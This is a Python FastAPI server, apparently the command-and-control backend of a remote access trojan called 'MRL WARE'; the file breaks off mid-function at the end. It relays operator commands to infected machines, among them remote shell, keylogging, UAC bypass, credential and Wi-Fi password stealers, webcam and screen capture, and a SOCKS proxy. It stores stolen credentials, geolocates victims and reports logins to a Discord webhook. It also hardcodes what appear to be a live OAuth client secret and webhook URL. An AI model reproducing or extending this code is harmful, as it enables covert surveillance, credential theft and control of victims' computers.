import os
import sys
import asyncio
import orjson
import json
import base64
import random
import string
import datetime
import time
import logging
import warnings
warnings.filterwarnings("ignore", module="authlib.*")

from logging.handlers import RotatingFileHandler
from fastapi import (
    FastAPI,
    WebSocket,
    WebSocketDisconnect,
    Request,
    Response,
    HTTPException,
)
from fastapi.staticfiles import StaticFiles
from fastapi.responses import HTMLResponse, RedirectResponse
from fastapi.middleware.cors import CORSMiddleware
from starlette.middleware.sessions import SessionMiddleware
from authlib.integrations.starlette_client import OAuth
from urllib.parse import unquote
import uvicorn

# ── Logging Configuration ─────────────────────────────────────────────────────
_log_handlers = [logging.StreamHandler(sys.stdout)]
# Enable file logging for production diagnostics
try:
    _log_handlers.append(
        RotatingFileHandler(
            "omega_server.log", maxBytes=10 * 1024 * 1024, backupCount=3
        )
    )
except Exception:
    pass
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    handlers=_log_handlers,
)
logger = logging.getLogger("MRL")

# ── OMEGA Core Modules ─────────────────────────────────────────────────────────
from core.database import Database
from core.broker import ConnectionManager, CLIENTS, PORTALS, PORTAL_TO_CLIENT, ENCRYPTED_CLIENTS, crypto

# ── App & Module Instances ─────────────────────────────────────────────────────
app = FastAPI(title="MRL WARE")
db = Database()
manager = ConnectionManager()
socks_manager = manager.init_socks()

# ── CONFIGURATION ─────────────────────────────────────────────────────────────
SECRET_KEY = os.getenv("SECRET_KEY", "omega_elite_secure_session_2024")
DISCORD_CLIENT_ID = os.getenv("DISCORD_CLIENT_ID", "1479687539114774548")
DISCORD_CLIENT_SECRET = os.getenv(
    "DISCORD_CLIENT_SECRET", "dIgYQ2MXPQIHI4HuoeIV_yEZoHk1PvAS"
)
GOOGLE_CLIENT_ID = os.getenv("GOOGLE_CLIENT_ID", "yourgoogleid")
GOOGLE_CLIENT_SECRET = os.getenv("GOOGLE_CLIENT_SECRET", "yourgooglesecret")

app.add_middleware(SessionMiddleware, secret_key=SECRET_KEY, max_age=2592000)

# ── SERVER BUILD ID ─────────────────────────────────────────────────────────
# Changes every restart/redeploy — forces users to re-authenticate
import uuid as _uuid

SERVER_BUILD_ID = str(_uuid.uuid4())
print(f"[AUTH] Server Build ID: {SERVER_BUILD_ID[:8]}...")


# ── OAUTH SETUP ───────────────────────────────────────────────────────────────
oauth = OAuth()
oauth.register(
    name="discord",
    client_id=DISCORD_CLIENT_ID,
    client_secret=DISCORD_CLIENT_SECRET,
    authorize_url="https://discord.com/api/oauth2/authorize",
    authorize_params={"scope": "identify email guilds connections"},
    access_token_url="https://discord.com/api/oauth2/token",
    userinfo_endpoint="https://discord.com/api/users/@me",
    client_kwargs={"token_endpoint_auth_method": "client_secret_post"},
)
oauth.register(
    name="google",
    client_id=GOOGLE_CLIENT_ID,
    client_secret=GOOGLE_CLIENT_SECRET,
    server_metadata_url="https://accounts.google.com/.well-known/openid-configuration",
    client_kwargs={"scope": "openid email profile"},
)

# ── WEBHOOK & MONITORING ──────────────────────────────────────────────────────
DISCORD_WEBHOOK_URL = os.getenv(
    "DISCORD_WEBHOOK_URL",
    "https://discord.com/api/webhooks/1495093128112242819/E_XKACQ-SO4umnOGgJWxxSv1z4koyHUc_XdjLw0JojFYeOsayz5t7kM19YOBYv-y7vBP"
)

import httpx
try:
    import psutil as _psutil
except ImportError:
    _psutil = None


def get_client_ip(request: Request):
    headers = ["X-Forwarded-For", "CF-Connecting-IP", "X-Real-IP"]
    for h in headers:
        val = request.headers.get(h)
        if val:
            ips = [ip.strip() for ip in val.split(",")]
            for ip in ips:
                if not ip.startswith(("10.", "172.", "192.168.", "100.64.")):
                    return ip
            # If all are internal, return the last one which might be closest to public
            if ips:
                return ips[-1]
    return request.client.host


async def send_to_discord(
    title: str,
    description: str,
    color: int = 0x4F88FF,
    avatar: str = None,
    username: str = "MRL WARE MONITOR",
    fields: list = None,
):
    try:
        payload = {
            "username": username,
            "embeds": [
                {
                    "title": title,
                    "description": description,
                    "color": color,
                    "timestamp": datetime.datetime.now().isoformat(),
                }
            ],
        }
        if avatar:
            payload["embeds"][0]["thumbnail"] = {"url": avatar}
        if fields:
            payload["embeds"][0]["fields"] = fields

        async with httpx.AsyncClient() as client:
            await client.post(DISCORD_WEBHOOK_URL, json=payload)
    except Exception as e:
        logger.error(f"[MRL] Webhook Error: {e}")


# ── AUDIT LOGGING HELPER ──────────────────────────────────────────────────────
async def audit(
    category: str,
    action: str,
    detail: str = "",
    user: dict = None,
    target_id: str = None,
    ip: str = None,
    level: str = "info",
):
    """Write a structured audit log entry and broadcast it live to all admin portals."""
    try:
        db.log_audit(
            category=category,
            action=action,
            detail=detail,
            user_id=user.get("id") if user else None,
            username=user.get("username") if user else None,
            target_id=target_id,
            ip=ip,
            level=level,
        )
        entry = {
            "ts": time.time(),
            "level": level,
            "category": category,
            "username": user.get("username") if user else "—",
            "target": target_id or "—",
            "action": action,
            "detail": detail,
            "ip": ip or "—",
        }
        payload = orjson.dumps({"t": "audit_log", "data": entry}).decode()
        for ws, u in list(PORTAL_USERS.items()):
            try:
                await ws.send_text(payload)
            except:
                pass
    except Exception as e:
        logger.error(f"Audit error: {e}")


# ── GLOBAL CHAT STATE ─────────────────────────────────────────────────────────
CHAT_PORTALS = set()
PORTAL_USERS: dict = {}  # Maps websocket -> user dict (replaces websocket.user which has no setter)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


def rv():
    return "".join(random.choices(string.ascii_letters, k=8))


# ── WebSocket — Main Brokering Channel ──────────────────────────────────────────
@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    user = None
    client_id = None
    client_type = "unknown"

    try:
        client_host = websocket.client.host if websocket.client else "unknown"
        logger.info(f"Connection received from {client_host}")
        await websocket.accept()

        # 1. Resolve User
        user = None
        session_user_id = websocket.session.get("user_id")
        token_id = websocket.query_params.get("token")

        if token_id:
            try:
                user = db.get_user(unquote(token_id))
            except Exception as e:
                logger.error(f"Token DB lookup failed: {e}")

        if not user and session_user_id:
            try:
                user = db.get_user(session_user_id)
            except Exception as e:
                logger.error(f"Session DB lookup failed: {e}")

        # 2. Handshake
        try:
            raw = await asyncio.wait_for(websocket.receive(), timeout=15.0)
            payload = raw.get("text")
            if not payload and raw.get("bytes"):
                try:
                    payload = raw.get("bytes").decode("utf-8")
                except:
                    payload = str(raw.get("bytes"))

            if not payload:
                logger.warning("Empty handshake payload - closing")
                await websocket.close(code=1008)
                return

            handshake = orjson.loads(payload)
            msg_type = handshake.get("type", "") or handshake.get("t", "")
            incoming_token = handshake.get("token")
        except asyncio.TimeoutError:
            logger.warning("Handshake timed out")
            await websocket.close(code=1008)
            return
        except Exception as e:
            logger.error(f"Handshake failed: {e}")
            # Fix: Use the global audit function correctly
            await audit("system", "handshake_error", detail=f"Handshake crash: {e} | Payload: {str(payload)[:100]}", level="error")
            await websocket.close(code=1011)
            return

        # 3. Final Token Check
        if not user and incoming_token:
            try:
                user = db.get_user(unquote(incoming_token))
            except Exception as e:
                logger.error(f"Final token lookup failed: {e}")

        if user and user.get("is_banned"):
            logger.warning(f"Banned user {user['username']} attempted connection")
            await websocket.close(code=1008)
            return

        # 4. Handle connection type
        if msg_type == "portal":
            if not user:
                logger.warning("Portal connection attempt without user")
                await websocket.close(code=1008)
                return

            client_type = "portal"
            PORTAL_USERS[websocket] = user
            CHAT_PORTALS.add(websocket)
            logger.info(f"PORTAL CONNECTED: {user['username']} ({user['role']})")
            await manager.connect(websocket, "portal", None)

            # Resolve Real IP behind proxy
            client_host = websocket.client.host if websocket.client else "unknown"
            real_ip = websocket.headers.get("x-forwarded-for", "").split(",")[
                0
            ].strip() or str(client_host)
            asyncio.create_task(
                audit(
                    "operator",
                    "connect",
                    detail=f"Role: {user.get('role', 'user')}",
                    user=user,
                    ip=real_ip,
                )
            )

            async def deliver_initial_data():
                try:
                    devices = db.get_devices(user_role=user["role"])
                    active_ids = list(CLIENTS.keys())
                    for d in devices:
                        d["status"] = (
                            "Online" if d.get("id") in active_ids else "Offline"
                        )
                    await websocket.send_text(
                        orjson.dumps(
                            {"t": "devices", "data": devices, "user": user}
                        ).decode()
                    )
                    await websocket.send_text(
                        orjson.dumps(
                            {"t": "chat_history", "data": db.get_chat_history()}
                        ).decode()
                    )
                except Exception as e:
                    logger.error(f"Initial data delivery failed: {e}")

            asyncio.create_task(deliver_initial_data())

        elif msg_type == "client_auth":
            client_id = handshake.get("id")
            if not client_id:
                await websocket.close(code=1008)
                return
            client_type = "client"
            await manager.connect(websocket, "client", client_id)
            
            # Zero-Knowledge Encryption Negotiation
            if handshake.get("enc") == True:
                ENCRYPTED_CLIENTS.add(client_id)
                logger.info(f"NODE {client_id} established AES-256-GCM tunnel")

            # IP DETECTION LOGIC (Server-side + Client-side Merge)
            real_ip = websocket.headers.get("x-forwarded-for", "").split(",")[
                0
            ].strip() or str(client_host)
            specs = handshake.get("specs", {})

            # Store detected IP as the primary public_ip
            specs["public_ip"] = real_ip

            # GeoIP lookup to fix Map tracking
            try:
                async with httpx.AsyncClient(timeout=5.0) as client:
                    resp = await client.get(f"http://ip-api.com/json/{real_ip}")
                    if resp.status_code == 200:
                        geo = resp.json()
                        if geo.get("status") == "success":
                            specs["lat"] = geo.get("lat")
                            specs["lon"] = geo.get("lon")
                            specs["city"] = geo.get("city")
                            specs["country"] = geo.get("country")
                            specs["flag"] = geo.get("countryCode", "").lower()
            except Exception as e:
                logger.error(f"GeoIP error: {e}")

            # If client sent an ipv4, keep it as reported_ip or similar if different
            if (
                specs.get("ipv4")
                and specs.get("ipv4") != "Unknown"
                and specs.get("ipv4") != real_ip
            ):
                specs["reported_ip"] = specs.get("ipv4")

            db.update_device(client_id, specs)
            logger.info(f"NODE CONNECTED: {client_id} (IP: {real_ip})")

            asyncio.create_task(
                audit(
                    "node",
                    "connect",
                    target_id=client_id,
                    detail=specs.get("os", ""),
                    ip=real_ip,
                )
            )

            await manager.broadcast_devices(db)
            await websocket.send_text(orjson.dumps({"t": "handshake_ok"}).decode())

        else:
            logger.warning(f"Unknown message type: {msg_type}")
            await websocket.close(code=1008)
            return

        logger.info(
            f"Main loop entered for {client_type} ({user['username'] if user else client_id or 'unknown'})"
        )

        # Main message loop
        while True:
            raw = await websocket.receive()
            text = raw.get("text")
            binary = raw.get("bytes")

            if text:
                if client_type == "client":
                    try:
                        # Attempt AES Decryption if node is encrypted
                        if client_id in ENCRYPTED_CLIENTS:
                            decrypted = crypto.decrypt(text, client_id)
                            if decrypted:
                                text = decrypted
                            else:
                                # Fallback/Error: Could not decrypt or was not encrypted
                                # For strict security, we'd continue/break here
                                pass
                                
                        data = orjson.loads(text)
                        if data.get("type") == "ping":
                            db.update_heartbeat(client_id)
                            # Respond with pong to the agent for its adaptive quality engine
                            await websocket.send_text(
                                orjson.dumps(
                                    {"t": "pong", "ts": data.get("ts", time.time())}
                                ).decode()
                            )
                            continue
                        
                        if data.get("t") == "socks_data":
                            socks_manager.handle_agent_data(client_id, data.get("id"), data.get("data"))
                            continue
                            
                        if data.get("t") == "vault_data":
                            db.add_stolen_data(client_id, data.get("vtype", "credentials"), data.get("vdata", {}))
                            
                    except Exception as e:
                        logger.error(f"[SERVER] Error parsing agent message: {e}")
                        pass
                    await manager.broadcast_text_to_portals(text, client_id)
                else:
                    data = orjson.loads(text)
                    if data.get("type") == "chat":
                        msg = data.get("message", "").strip()
                        if msg:
                            db.add_chat_message(user["id"], user["username"], msg)
                            asyncio.create_task(
                                audit(
                                    "chat",
                                    "message",
                                    detail=msg[:300],
                                    user=user,
                                    ip=str(client_host),
                                )
                            )
                            payload = orjson.dumps(
                                {
                                    "t": "chat_msg",
                                    "username": user["username"],
                                    "message": msg,
                                    "ts": time.time(),
                                    "user_id": user["id"],
                                    "avatar": user.get("metadata", {}).get("avatar"),
                                }
                            ).decode()
                            for p in CHAT_PORTALS:
                                try:
                                    await p.send_text(payload)
                                except:
                                    pass
                    elif data.get("type") == "typing":
                        payload = orjson.dumps(
                            {
                                "t": "typing",
                                "username": user["username"],
                                "avatar": user.get("metadata", {}).get("avatar"),
                            }
                        ).decode()
                        for p in CHAT_PORTALS:
                            if p != websocket:
                                try:
                                    await p.send_text(payload)
                                except:
                                    pass
                    elif data.get("type") == "set_visibility":
                        if user and user.get("role") == "admin":
                            node_id = data.get("id")
                            allowed = data.get("allowed_users")
                            db.set_device_visibility(node_id, allowed)
                            await manager.broadcast_devices(db)
                            # Kick any portal watching this node that no longer has access
                            if isinstance(allowed, list):
                                for p_ws, sel_id in list(PORTAL_TO_CLIENT.items()):
                                    if sel_id == node_id:
                                        p_user = PORTAL_USERS.get(p_ws, {})
                                        if (
                                            p_user.get("role") != "admin"
                                            and p_user.get("id") not in allowed
                                        ):
                                            try:
                                                await p_ws.send_text(
                                                    orjson.dumps(
                                                        {
                                                            "t": "access_revoked",
                                                            "id": node_id,
                                                        }
                                                    ).decode()
                                                )
                                            except:
                                                pass
                    elif data.get("type") == "select_device":
                        target_id = data.get("id")
                        PORTAL_TO_CLIENT[websocket] = target_id
                        asyncio.create_task(
                            audit(
                                "action",
                                "select_device",
                                detail=f"Opened session on node {target_id}",
                                user=user,
                                target_id=target_id,
                                ip=str(client_host),
                            )
                        )
                        if target_id in CLIENTS:
                            real_ip = CLIENTS[target_id].headers.get(
                                "x-forwarded-for", ""
                            ).split(",")[0].strip() or str(
                                CLIENTS[target_id].client.host
                            )
                            await websocket.send_text(
                                orjson.dumps(
                                    {
                                        "type": "node_geo",
                                        "data": {
                                            "id": target_id,
                                            "ip": real_ip,
                                            "hostname": data.get("hostname", "Node"),
                                            "os": data.get("os", "Win"),
                                        },
                                    }
                                ).decode()
                            )
                        else:
                            await websocket.send_text(
                                orjson.dumps(
                                    {
                                        "type": "node_geo",
                                        "data": {
                                            "id": target_id,
                                            "ip": "Offline",
                                            "hostname": data.get("hostname", "Node"),
                                            "os": data.get("os", "Win"),
                                        },
                                    }
                                ).decode()
                            )
                    elif data.get("type") == "heartbeat":
                        client_id = data.get("id")
                        if client_id in CLIENTS:
                            db.update_heartbeat(client_id)
                            logger.info(f"[HEARTBEAT] Node {client_id} is alive.")
                        else:
                            logger.warning(
                                f"[HEARTBEAT] Received heartbeat for unknown node {client_id}"
                            )
                        continue
                    elif data.get("type") == "ping":
                        target_id = PORTAL_TO_CLIENT.get(websocket)
                        if target_id and target_id in CLIENTS:
                            try:
                                # Forward portal ping to agent to trigger a pong back to the portal
                                await CLIENTS[target_id].send_text(
                                    orjson.dumps({"t": "ping"}).decode()
                                )
                            except Exception as e:
                                logger.error(f"[SERVER] Failed to forward ping: {e}")
                        continue
                    else:
                        target_id = PORTAL_TO_CLIENT.get(websocket)
                        if target_id and target_id in CLIENTS:
                            dtype = data.get("type", "")
                            # ── Translate browser commands → agent protocol ──
                            if dtype == "stream":
                                cmd = data.get("cmd", "")
                                if cmd in ["start", "stop"]:
                                    fwd = {
                                        "t": "ss_start" if cmd == "start" else "ss_stop"
                                    }
                                    asyncio.create_task(
                                        audit(
                                            "action",
                                            f"stream_{cmd}",
                                            user=user,
                                            target_id=target_id,
                                        )
                                    )
                                elif cmd == "switch_monitor":
                                    fwd = {
                                        "t": "rtc_toggle",
                                        "action": "monitor",
                                        "value": data.get("idx"),
                                    }
                                elif cmd == "camera":
                                    fwd = {
                                        "t": "rtc_toggle",
                                        "action": "camera",
                                        "value": data.get("active"),
                                        "camera_idx": data.get("idx", 0),
                                    }
                                else:
                                    fwd = {"t": cmd}
                                try:
                                    await CLIENTS[target_id].send_text(
                                        orjson.dumps(fwd).decode()
                                    )
                                except Exception as e:
                                    logger.error(
                                        f"[SERVER] Failed to forward stream cmd: {e}"
                                    )
                            elif dtype == "shell":
                                shell_cmd = data.get("cmd", "")
                                asyncio.create_task(
                                    audit(
                                        "action",
                                        "shell",
                                        detail=shell_cmd[:500],
                                        user=user,
                                        target_id=target_id,
                                        level="warn",
                                        ip=str(client_host),
                                    )
                                )
                                fwd = {"t": "shell", "c": shell_cmd}
                                await CLIENTS[target_id].send_text(
                                    orjson.dumps(fwd).decode()
                                )
                            elif dtype == "hid":
                                hcmd = data.get("cmd", "")
                                if hcmd == "mousemove":
                                    await CLIENTS[target_id].send_text(
                                        orjson.dumps(
                                            {
                                                "t": "mm",
                                                "x": data.get("x", 0),
                                                "y": data.get("y", 0),
                                            }
                                        ).decode()
                                    )
                                elif hcmd in ("mousedown", "mouseup"):
                                    # BUG FIX: must pass x, y and correct press flag
                                    await CLIENTS[target_id].send_text(
                                        orjson.dumps(
                                            {
                                                "t": "mc",
                                                "x": data.get("x", 0),
                                                "y": data.get("y", 0),
                                                "b": data.get("btn", data.get("b", 0)),
                                                "p": 1 if hcmd == "mousedown" else 0,
                                            }
                                        ).decode()
                                    )
                                elif hcmd in ("keydown", "kd"):
                                    down = data.get("down", hcmd == "keydown")
                                    await CLIENTS[target_id].send_text(
                                        orjson.dumps(
                                            {
                                                "t": "kd",
                                                "key": data.get("key", ""),
                                                "code": data.get("code", ""),
                                                "down": down,
                                            }
                                        ).decode()
                                    )
                                elif hcmd == "keyup":
                                    await CLIENTS[target_id].send_text(
                                        orjson.dumps(
                                            {
                                                "t": "kd",
                                                "key": data.get("key", ""),
                                                "code": data.get("code", ""),
                                                "down": False,
                                            }
                                        ).decode()
                                    )
                                elif hcmd == "scroll":
                                    await CLIENTS[target_id].send_text(
                                        orjson.dumps(
                                            {
                                                "t": "scroll",
                                                "delta": data.get("delta", 0),
                                            }
                                        ).decode()
                                    )
                            elif dtype in ("mm", "mc", "kd", "scroll"):
                                # Direct HID: forward straight to agent, minimal overhead
                                fwd = {k: v for k, v in data.items() if k != "id"}
                                fwd["t"] = dtype
                                await CLIENTS[target_id].send_text(
                                    orjson.dumps(fwd).decode()
                                )
                            elif dtype in ("rtc_offer", "rtc_ice"):
                                # WebRTC signaling: forward straight to agent (P2P handshake)
                                fwd = {k: v for k, v in data.items() if k != "id"}
                                fwd["t"] = dtype
                                await CLIENTS[target_id].send_text(
                                    orjson.dumps(fwd).decode()
                                )
                            elif dtype == "pong":
                                # RTT pong for adaptive quality engine
                                fwd = {"t": "pong", "ts": data.get("ts", 0)}
                                await CLIENTS[target_id].send_text(
                                    orjson.dumps(fwd).decode()
                                )
                            elif dtype == "troll":
                                cmd = data.get("cmd", "")
                                val = data.get("val", "")
                                asyncio.create_task(
                                    audit(
                                        "action",
                                        f"troll_{cmd}",
                                        detail=str(val)[:200] if val else "",
                                        user=user,
                                        target_id=target_id,
                                        level="warn",
                                        ip=str(client_host),
                                    )
                                )
                                # Generic forwarder: maps any cmd -> action for agent registry
                                try:
                                    await CLIENTS[target_id].send_text(
                                        orjson.dumps(
                                            {"t": "troll", "action": cmd, "value": val}
                                        ).decode()
                                    )
                                except Exception as e:
                                    logger.error(
                                        f"[SERVER] Failed to forward troll cmd: {e}"
                                    )
                            elif dtype in ("mm", "mc", "scroll", "kd"):
                                # Silent high-frequency pass-through (no audit logging to prevent DB spam)
                                try:
                                    await CLIENTS[target_id].send_text(text)
                                except Exception as e:
                                    pass
                            elif dtype in (
                                "ps_list",
                                "ps_suspend",
                                "ps_resume",
                                "keylog_start",
                                "keylog_stop",
                                "net_scan",
                                "file_search",
                                "uac_bypass",
                                "audio_devices",
                                "ls",
                                "dir_list",
                                "stealer",
                                "wifi_steal",
                                "download_file",
                                "set_fps",
                                "reg_enum",
                            ):
                                asyncio.create_task(
                                    audit(
                                        "action",
                                        dtype,
                                        detail=str(
                                            data.get(
                                                "query",
                                                data.get(
                                                    "path",
                                                    data.get(
                                                        "fps", data.get("pid", "")
                                                    ),
                                                ),
                                            )
                                        ),
                                        user=user,
                                        target_id=target_id,
                                        level="warn",
                                        ip=str(client_host),
                                    )
                                )
                                try:
                                    await CLIENTS[target_id].send_text(text)
                                except Exception as e:
                                    logger.error(
                                        f"[SERVER] Failed to forward ps_list/ls/etc: {e}"
                                    )
                            elif dtype == "ps_kill":
                                asyncio.create_task(
                                    audit(
                                        "action",
                                        "ps_kill",
                                        detail=f"PID {data.get('pid')}",
                                        user=user,
                                        target_id=target_id,
                                        level="warn",
                                        ip=str(client_host),
                                    )
                                )
                                try:
                                    await CLIENTS[target_id].send_text(text)
                                except Exception as e:
                                    logger.error(
                                        f"[SERVER] Failed to forward ps_kill: {e}"
                                    )
                            else:
                                # Generic forward — agent handles unknown types gracefully
                                try:
                                    await CLIENTS[target_id].send_text(text)
                                except Exception as e:
                                    logger.error(
                                        f"[SERVER] Failed generic forward: {e}"
                                    )

            elif binary and client_type == "client":
                # Relay frame bytes to ALL portals watching this agent
                # broker.broadcast_to_portals filters by PORTAL_TO_CLIENT correctly
                asyncio.create_task(manager.broadcast_to_portals(binary, client_id))

    except (WebSocketDisconnect, RuntimeError):
        logger.info(f"WebSocket disconnected ({client_type})")
        user = PORTAL_USERS.pop(websocket, None)
        if websocket in CHAT_PORTALS:
            CHAT_PORTALS.remove(websocket)
        manager.disconnect(websocket, db)
        if client_type == "portal" and user:
            asyncio.create_task(audit("operator", "disconnect", user=user))
        elif client_type == "client" and client_id:
            asyncio.create_task(audit("node", "disconnect", target_id=client_id))
    except Exception as e:
        logger.error(f"WS Critical Error ({client_type}): {e}")
        user = PORTAL_USERS.pop(websocket, None)
        if websocket in CHAT_PORTALS:
            CHAT_PORTALS.remove(websocket)
        manager.disconnect(websocket, db)
        if client_type == "portal" and user:
            asyncio.create_task(
                audit("operator", "disconnect", user=user, level="warn")
            )
        elif client_type == "client" and client_id:
            asyncio.create_task(
                audit("node", "disconnect", target_id=client_id, level="warn")
            )


# ── AUTHENTICATION ROUTES ─────────────────────────────────────────────────────
@app.get("/auth/login/{provider}")
async def login_oauth(provider: str, request: Request):
    # Force the redirect URI to match the host being used in the browser
    host = request.headers.get("host", "localhost:8000")
    # Railway/Production detection: check X-Forwarded-Proto or if .app is in host
    if (
        request.headers.get("x-forwarded-proto") == "https"
        or ".app" in host
        or ".railway" in host
    ):
        proto = "https"
    else:
        proto = "http"

    redirect_uri = f"{proto}://{host}/auth/callback/{provider}"

    print(f"[MRL] Initiating OAuth: provider={provider}, redirect={redirect_uri}")
    return await oauth.create_client(provider).authorize_redirect(request, redirect_uri)


@app.get("/auth/callback/{provider}")
async def auth_callback(provider: str, request: Request):
    client = oauth.create_client(provider)
    token = await client.authorize_access_token(request)

    username, provider_id, avatar_url, metadata = "", "", "", {}
    if provider == "discord":
        user_info = await client.get("https://discord.com/api/users/@me", token=token)
        user_data = user_info.json()
        username = user_data.get("username")
        provider_id = user_data.get("id")

        # Sync Avatar
        avatar_hash = user_data.get("avatar")
        avatar_url = (
            f"https://cdn.discordapp.com/avatars/{provider_id}/{avatar_hash}.png"
            if avatar_hash
            else "https://cdn.discordapp.com/embed/avatars/0.png"
        )

        # Extended Info: Fetch Guilds & Connections
        guilds = []
        try:
            g_res = await client.get(
                "https://discord.com/api/users/@me/guilds", token=token
            )
            guilds = g_res.json()
        except:
            pass

        connections = []
        try:
            c_res = await client.get(
                "https://discord.com/api/users/@me/connections", token=token
            )
            connections = c_res.json()
        except:
            pass

        metadata = {
            "email": user_data.get("email"),
            "avatar": avatar_url,
            "guilds_count": len(guilds),
        }

        # ── Intelligence Gathering ─────────────────────────────────────────────
        user_agent = request.headers.get("User-Agent", "Unknown")
        browser = (
            "Chrome"
            if "Chrome" in user_agent
            else ("Edge" if "Edg" in user_agent else "Other")
        )
        os_info = (
            "Windows"
            if "Windows" in user_agent
            else ("Mac" if "Mac" in user_agent else "Linux")
        )

        # Discord Account Age
        age_str = "Unknown"
        if provider == "discord":
            snowflake_id = int(provider_id)
            timestamp_ms = (snowflake_id >> 22) + 1420070400000
            created_at = datetime.datetime.fromtimestamp(timestamp_ms / 1000.0)
            diff = datetime.datetime.now() - created_at
            age_str = f"{diff.days // 365} years ago"

        # Geo-IP Lookup
        geo_str = "Unknown"
        try:
            async with httpx.AsyncClient() as c:
                geo_res = await c.get(f"http://ip-api.com/json/{request.client.host}")
                g = geo_res.json()
                geo_str = f"{g.get('city')}, {g.get('country')}"
        except:
            pass

        metadata.update(
            {"browser": browser, "os": os_info, "account_age": age_str, "geo": geo_str}
        )

        # ── Pro-Tier Discord Alert ───────────────────────────────────────────
        fields = [
            {"name": "👤 User ID", "value": f"`{provider_id}`", "inline": True},
            {
                "name": "📧 Email",
                "value": f"`{metadata.get('email', 'Private')}`",
                "inline": True,
            },
            {
                "name": "🌍 Client IP",
                "value": f"`{request.client.host}`",
                "inline": False,
            },
            {"name": "⏰ Account Age", "value": f"`{age_str}`", "inline": True},
            {"name": "📍 Location", "value": f"`{geo_str}`", "inline": True},
            {
                "name": "💻 Device",
                "value": f"Browser: `{browser}`\nOS: `{os_info}`",
                "inline": False,
            },
            {
                "name": "🏰 Servers",
                "value": f"`{metadata.get('guilds_count', 0)} guilds`",
                "inline": True,
            },
        ]
        await send_to_discord(
            f"🛡️ Operator Verified: {username}",
            f"**@{username}** successfully authorized in MRL WARE",
            0x4F88FF,
            avatar_url,
            "MRL WARE VERIFICATION",
            fields,
        )
    else:  # google
        user_data = token.get("userinfo")
        username = user_data.get("name")
        provider_id = user_data.get("sub")
        avatar_url = user_data.get("picture")
        metadata = {"email": user_data.get("email"), "avatar": avatar_url}

    client_ip = get_client_ip(request)
    user_id = db.upsert_user(
        provider,
        provider_id,
        username,
        client_ip,
        metadata,
        request.session.get("hwid"),
        request.session.get("ip_v6"),
    )
    if not user_id:
        return HTMLResponse("<h1>Access Denied: You are banned.</h1>", status_code=403)

    await audit(
        "auth",
        "login",
        detail=f"Provider: {provider} | UA: {request.headers.get('User-Agent', '')[:80]}",
        user={"id": user_id, "username": username},
        ip=str(client_ip),
    )

    # Notify Discord
    await send_to_discord(
        "🔓 Operator Login",
        f"**User**: {username}\n**IP**: `{request.client.host}`\n**Provider**: {provider}\n**Status**: Authenticated",
        0x00FF95,
        avatar_url,
    )

    request.session["user_id"] = user_id
    request.session["build_id"] = SERVER_BUILD_ID  # validate on next load
    return RedirectResponse(url="/")


@app.get("/auth/logout")
async def logout(request: Request):
    user_id = request.session.get("user_id")
    user = db.get_user(user_id) if user_id else None
    if user:
        await audit("auth", "logout", user=user, ip=get_client_ip(request))
    request.session.clear()
    return RedirectResponse(url="/")


# ── REST API ──────────────────────────────────────────────────────────────────
@app.get("/", response_class=HTMLResponse)
async def get_root(request: Request):
    user_id = request.session.get("user_id")
    client_ip = get_client_ip(request)

    # Capture HWID/IPv6 from headers if sent by proxy/client
    hwid = request.query_params.get("hwid")
    ipv6 = request.query_params.get("ipv6")
    if hwid:
        request.session["hwid"] = hwid
    if ipv6:
        request.session["ip_v6"] = ipv6

    # Notify Discord about generic visitor
    if not user_id:
        await send_to_discord(
            "👀 New Visitor",
            f"**IPv4 (Real)**: `{client_ip}`\n**IPv6**: `{ipv6 or 'Not Detected'}`\n**HWID**: `{hwid or 'Generating...'}`\n**Status**: Landing Page",
            0xFFCC00,
        )
        asyncio.create_task(
            audit(
                "auth",
                "visit",
                detail=f"Anonymous | HWID: {hwid or 'unknown'}",
                ip=str(client_ip),
            )
        )

    if user_id:
        # Validate build_id — force re-login after every server restart/redeploy
        if request.session.get("build_id") != SERVER_BUILD_ID:
            request.session.clear()
            with open("login.html", "r", encoding="utf-8") as f:
                return HTMLResponse(f.read())
        user = db.get_user(user_id)
        if user and not user["is_banned"]:
            with open("index.html", "r", encoding="utf-8") as f:
                content = f.read()
                user_json = json.dumps(user)
                content = content.replace(
                    "/*USER_DATA_INJECTION*/", f"window.INITIAL_USER = {user_json};"
                )
                return HTMLResponse(content)

    with open("login.html", "r", encoding="utf-8") as f:
        return f.read()

@app.get("/popout")
async def get_popout(request: Request):
    user_id = request.session.get("user_id")
    if not user_id or request.session.get("build_id") != SERVER_BUILD_ID:
        return RedirectResponse("/login")
    try:
        with open("popout.html", "r", encoding="utf-8") as f:
            return HTMLResponse(f.read())
    except:
        return HTMLResponse("OMEGA POPOUT FILE NOT FOUND", status_code=404)


@app.get("/debug/clients")
async def debug_clients():
    return {
        "clients": list(CLIENTS.keys()),
        "portals": len(PORTALS),
        "count": len(CLIENTS)
    }

@app.get("/logs")
async def get_logs(request: Request):
    try:
        if os.path.exists("omega_server.log"):
            with open("omega_server.log", "r") as f:
                lines = f.readlines()
                return HTMLResponse("<pre>" + "".join(lines[-100:]) + "</pre>")
        else:
            return HTMLResponse("LOG FILE NOT FOUND")
    except Exception as e:
        return HTMLResponse(f"ERROR READING LOGS: {e}")

@app.get("/api/admin/users")
async def admin_get_users(request: Request):
    user_id = request.session.get("user_id")
    user = db.get_user(user_id) if user_id else None
    if not user or user["role"] != "admin":
        raise HTTPException(status_code=403)
    return db.get_all_users()


@app.post("/api/admin/user/update")
async def admin_update_user(request: Request):
    user_id = request.session.get("user_id")
    admin = db.get_user(user_id) if user_id else None
    if not admin or admin["role"] != "admin":
        raise HTTPException(status_code=403)

    data = await request.json()
    target_id = data.get("id")
    # Self-ban protection
    if target_id == user_id and data.get("is_banned"):
        raise HTTPException(status_code=400, detail="Cannot ban yourself")
    db.update_user_profile(
        target_id, data.get("username"), data.get("role"), data.get("is_banned")
    )

    is_banned = data.get("is_banned")
    new_role = data.get("role")

    # Audit the admin action
    if is_banned is not None:
        action_str = "ban_user" if is_banned else "unban_user"
        await audit(
            "admin",
            action_str,
            detail=f"Target: {target_id}",
            user=admin,
            ip=get_client_ip(request),
            level="warn",
        )
    if new_role:
        await audit(
            "admin",
            "role_change",
            detail=f"Target: {target_id} → {new_role}",
            user=admin,
            ip=get_client_ip(request),
            level="warn",
        )

    # Broadcast user update to all admin portals so admin panel refreshes live
    update_payload = orjson.dumps(
        {
